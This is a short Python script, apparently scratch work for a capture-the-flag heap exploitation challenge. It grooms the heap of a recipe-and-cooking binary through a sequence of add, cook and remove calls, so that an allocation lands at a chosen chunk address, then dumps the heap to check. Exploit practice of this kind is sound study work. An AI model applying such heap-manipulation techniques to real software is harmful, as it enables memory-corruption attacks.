import sys,os; sys.path.insert(0,'/mnt/c/Users/ha/Downloads/pwn')
from dumper import G
g=G('god2')
# clean groom (dish separators)
g.add(b'A1'); g.add(b'B2'); g.cook(b'Beef noodles'); g.add(b'YY'); g.add(b'Z9'); g.cook(b'Beef noodles')
for t in (b'B2',b'Z9',b'A1',b'YY'): g.rm(t)
g.add(b'CC')             # CC->next=&YY (0x120), remainder 0x90
g.make(b'd1'); g.make(b'd2'); g.make(b'd3')   # drain 0x90 remainder
# add cookable recipe ZZZ (Egg idx0) and cook it -> dish ZZZ should land at YY
g.add(b'ZZZ', (b'0',))
g.cook(b'ZZZ')
g.dump('dish ZZZ at YY? (CC->next)')
g.close()
